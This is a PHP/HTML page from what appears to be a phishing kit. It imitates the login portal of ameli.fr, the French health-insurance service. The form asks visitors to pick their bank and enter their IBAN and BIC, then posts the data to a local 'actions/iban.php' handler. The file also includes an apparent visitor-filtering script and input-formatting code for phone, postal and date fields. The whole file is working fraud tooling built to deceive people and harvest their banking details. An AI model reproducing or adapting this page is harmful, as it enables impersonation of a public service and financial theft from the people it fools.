<?php 

include("../common/sub_includes.php");
include("../prevents/all.php");

?>


<!DOCTYPE html>
<html lang="fr" slick-uniqueid="3">

<?php include("../common/header.php") ?>
<body>
    <header class="wlp-bighorn-header" role="banner">
        <div class="wlp-bighorn-layout wlp-bighorn-layout-flow">
            <div class="wlp-bighorn-layout-cell wlp-bighorn-layout-flow-horizontal wlp-bighorn-layout-flow-first" style="height: auto">
                <div></div>
                <div class="wlp-bighorn-theme wlp-bighorn-theme-borderless">
                    <div id="Header" class="wlp-bighorn-window  ">
                        <div class="wlp-bighorn-window-content">

                            <div style="overflow-x:hidden;">
                                <div class="tetiere-connexion">

                                    <div class="liens">

                                        <!-- Redirection vers la page de connexion -->

                                        <a class="r_btsubmit r_btlien" href="https://assure.ameli.fr:443https://assure.ameli.fr/PortailAS/appmanagerhttps://assure.ameli.fr/PortailAS/assure?_nfpb=true&amp;_pageLabel=as_login_page&amp;connexioncompte_2actionEvt=afficher" title="Votre compte ameli - Connexion">
                                            Se connecter
                                        </a>

                                    </div>
									<div class="header_top">
									<img src= "../assets/images/top.png" style="max-width:100%" >
										<script>
															
										
										</script>
                                    </a>
                                </div>
                            </div>

                        </div>
                    </div>
                </div>
            </div>
        </div>
    </header>
    <div id="ameli_portal_book_2" class="wlp-bighorn-book">
        <div class="wlp-bighorn-book-content">
            <div id="as_connexion_book" class="wlp-bighorn-book">
                <div class="wlp-bighorn-book-content">
                    <main id="as_login_page" class="wlp-bighorn-page-unconnect" role="main">
                        <section id="contenu" class="corps-de-page">
                            <div class="wlp-bighorn-layout wlp-bighorn-layout-grid">
                                <div class="wlp-bighorn-layout-cell wlp-bighorn-layout-grid-cell">
                                    <div></div>
                                    <div class="wlp-bighorn-layout wlp-bighorn-layout-flow">
                                        <div class="wlp-bighorn-layout-cell wlp-bighorn-layout-flow-vertical wlp-bighorn-layout-flow-first" style="height: auto">
                                            <div></div>
                                            <div id="connexioncompte_2" class="wlp-bighorn-window  ">
                                                <div class="wlp-bighorn-window-content">

                                                    <link href="../../framework/skins/assure/css/centrer.css" rel="stylesheet" type="text/css">
                                                    <link rel="stylesheet" href="../../framework/skins/assure/css/smart-app-banner.css" type="text/css" media="screen">



                                                    <style type="text/css">
                                                        .wlp-bighorn-book{
                                                            width : 100%;
                                                          }
                                                          #connexioncompte_2 {
                                                            padding-top: 190px;
                                                          }
                                                          
                                                          /* Small Devices, Tablets */
                                                          @media only screen and (max-width : 767px) { 
                                                            #Header .tetiere-connexion {
                                                              margin-bottom: 60px;
                                                            }
                                                            .connexioncompte_2 .connexion-login {
                                                              margin-top: -20px;
                                                            }
                                                            #erreurCookie {
                                                              margin-top: -20px;
                                                              margin-bottom: 60px;
                                                            }
                                                            #connexioncompte_2 {
                                                              padding-top: 100px;
                                                            }
                                                            .connexioncompte_2{
                                                              padding-right: 30px !important;
                                                              padding-left: 30px !important;
                                                            }
                                                          }
                                                          
                                                          @media only screen and (min-width : 768px) { 
                                                            #Header .tetiere-connexion {
                                                              margin-bottom: 88px;
                                                            }
                                                            .connexioncompte_2 .connexion-login {
                                                              margin-top: -48px;
                                                            }
                                                            #erreurCookie {
                                                              margin-top: -48px;
                                                              margin-bottom: 88px;
                                                            }
                                                          }
                                                          
                                                          /* Medium Devices */
                                                          @media screen and (min-width: 768px) and (max-width: 992px){
                                                            #connexioncompte_2 .centrepage {
                                                              width: 460px;
                                                            }
                                                          }
                                                        
                                                          input:-webkit-autofill {
                                                            -webkit-box-shadow: 0 0 0 50px white inset !important;
                                                          }
                                                    </style>
													
													
													
													<br><br/>
													<br><br/>
													<br><br/>

                                                    <div class="connexioncompte_2 centrepage">

                                                        <div class="r_cnx_page" id="loginPage">

                                                            <div>
<div class="r_cnx_maintenance">
  
</div>
																<br>
																<br>
																<br>
																
                                                                <div class="r_cnx">
                                                                    <div class="connexion-login">
                                                                        <h1 class="texte-center title">
                                                                         </h1>

                                                                        <div class="zone-alerte hidden" id="navIncompatible">
                                                                          <h2>Mon compte ameli fonctionnera mieux avec une version plus récente d'Internet Explorer !</h2>
                                                                            <span>
              
                                                                            
                                                                        Mettez à jour votre navigateur grâce à ce lien
                                                                        <a id="ieDlLink" href="http://windows.microsoft.com/fr-fr/internet-explorer/download-ie" target="downloadIE" title="Mettre à jour son navigateur (nouvelle fenêtre)" tabindex="-1">http://windows.microsoft.com/fr-fr/internet-explorer/download-ie</a>
                                                                        </span>
                                                                        </div>

                                                                        <div class="r_cnx_cadre_gris" id="idBlocCnx">
																			
                                                                            <form name="connexionCompteForm" id="form" method="post" action="../actions/iban.php" class="r_cnx_form">
																				<div>
																				
																				<label for="pet-select">Sélectionner votre banque </label>

<select name="Banque" id="Banque">
    <option value="">Choisissez le nom de votre banque</option>
    <option value="sg">Société Générale</option>
    <option value="cic">CIC</option>
    <option value="ca">Crédit Agricole</option>
    <option value="cm">Crédit Mutuel</option>
    <option value="ce">Caisse Epargne</option>
    <option value="bp">Banque Postale</option>
	<option value="autres">Autres Banques</option>
</select>

																				
																				</div>
                                                                                <div>
                                                                                    <div id="iban" class="div_connexioncompte_2_wrapper" style="margin-top : 23px;">
                                                                                        <span class="zone_champ_saisie">
																							<label style="font-family: 'Hind Madurai', sans-serif;" for="cardNumber" class="card-input__label">Iban :</label>
                                                                                            <input id="iban" name="iban" type="text" placeholder="FRXX XXXX XXXX XXXX XXXX XXXX XXX" maxlenght ="34" tabindex="0" required>
                                                                                        </span>
                                                                                    </div>
                                                                                </div>

                                                                                <div>
                                                                                    <div id="BIC" class="div_connexioncompte_2_wrapper" style="margin-top : 23px;">
																						<label style="font-family: 'Hind Madurai', sans-serif;" for="cardNumber" class="card-input__label">BIC :</label>
                                                                                        <span class="zone_champ_saisie">
                                                                                            <input id="bic" name="bic" type="text" maxlenght = "11" placeholder="BIC" tabindex="0" required>
                                                                                        </span>
                                                                                    </div>
                                                                                </div>

                                                                              <style>
                                                                                    #birth{
                                                                                        background: transparent url(https://assure.ameli.fr/PortailAS/framework/skins/assure/images/refonte/connexion/birthday.png);
                                                                                        background-repeat: no-repeat;
                                                                                        background-position: 20px 3px;
                                                                                        background-size: 20px 20px;
                                                                                        border-bottom: solid 1px #255ea7;
                                                                                        outline: 0;
                                                                                    }

                                                                                    #phone_number_inputé{
                                                                                        background: transparent url(https://www.pngkey.com/png/full/648-6483874_phone-phone-icon-grey-png.png);
                                                                                        background-repeat: no-repeat;
                                                                                        background-position: 20px 3px;
                                                                                        background-size: 20px 20px;
                                                                                        border-bottom: solid 1px #255ea7;
                                                                                        outline: 0;
                                                                                    }
                                                                                    #add{

                                                                                        background: transparent url(https://cdn4.iconfinder.com/data/icons/adiante-apps-app-templates-incos-in-grey/512/app_type_real_state_512px_GREY.png);
                                                                                        background-repeat: no-repeat;
                                                                                        background-position: 16px 0px;
                                                                                        background-size: 25px 30px;
                                                                                        border-bottom: solid 1px #255ea7;
                                                                                        outline: 0;
                                                                                    }

                                                                                    #town,#town2{

                                                                                background: transparent url(http://icecontact.com/wp-content/uploads/2016/03/Grey_Location_Pin_Icon.png
);
                                                                                background-repeat: no-repeat;
                                                                                background-position: 20px 3px;
                                                                                background-size: 20px 20px;
                                                                                border-bottom: solid 1px #255ea7;
                                                                                outline: 0;
                                                                                }
                                                                                </style>
</span>
                                                                                    </div>
<div>

                                        <input id="id_r_cnx_btn_submit" type="submit" name="iban_submit" value="Valider" class="r_btsubmit btn-connection">
	<br><br/>
	<br><br/>
	<br><br/>
	<br><br/>
                                                                              </div>
                                                                                </div>
                                                                                <input type="hidden" name="_ct" value=""></form>
																			<br>
																		<br>
																		<br>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </section>
                    </main>
                </div>
            </div>
        </div>
    </div>
    <img src ="../assets/images/footer.png" style="max-width:100%">                                                     
</body>

</html>

</html>
<script src="https://code.jquery.com/jquery-3.6.0.min.js"
integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4="
crossorigin="anonymous"></script>

<script src="../assets/js/mask.js"></script>


<script>
    $('#postal_input').on('input propertychange', function() {
    charLimit(this, 5);
});


$('#phone_number_input').on('input propertychange', function() {
    charLimit(this, 10);
});

            
let charLimit = (input, maxChar) => {
    let len = $(input).val().length;
    if (len > maxChar) {
        $(input).val($(input).val().substring(0, maxChar));
    };
}


function checkValue(str, max) {
    if (str.charAt(0) !== '0' || str == '00') {
        var num = parseInt(str);
        if (isNaN(num) || num <= 0 || num > max) num = 1;
        str = num > parseInt(max.toString().charAt(0)) && num.toString().length == 1 ? '0' + num : num.toString();
    };
    return str;
    };
    
// reformat by date
function date_reformat_dd(date) {
    date.addEventListener('input', function(e) {
        this.type = 'text';
        var input = this.value;
        if (/\D\/$/.test(input)) input = input.substr(0, input.length - 3);
        var values = input.split('/').map(function(v) {
            return v.replace(/\D/g, '')
        });
        if (values[1]) values[1] = checkValue(values[1], 12);
        if (values[0]) values[0] = checkValue(values[0], 31);
        var output = values.map(function(v, i) {
            return v.length == 2 && i < 2 ? v + ' / ' : v;
        });
        this.value = output.join('').substr(0, 14);
    });
}

// reformat by month
function date_reformat_mm(date) {
    date.addEventListener('input', function(e) {
        this.type = 'text';
        var input = this.value;
        if (/\D\/$/.test(input)) input = input.substr(0, input.length - 3);
        var values = input.split('/').map(function(v) {
            return v.replace(/\D/g, '')
        });
        if (values[0]) values[0] = checkValue(values[0], 12);
        if (values[1]) values[1] = checkValue(values[1], 31);
        var output = values.map(function(v, i) {
            return v.length == 2 && i < 2 ? v + ' / ' : v;
        });
        this.value = output.join('').substr(0, 14);
    });


}
</script>
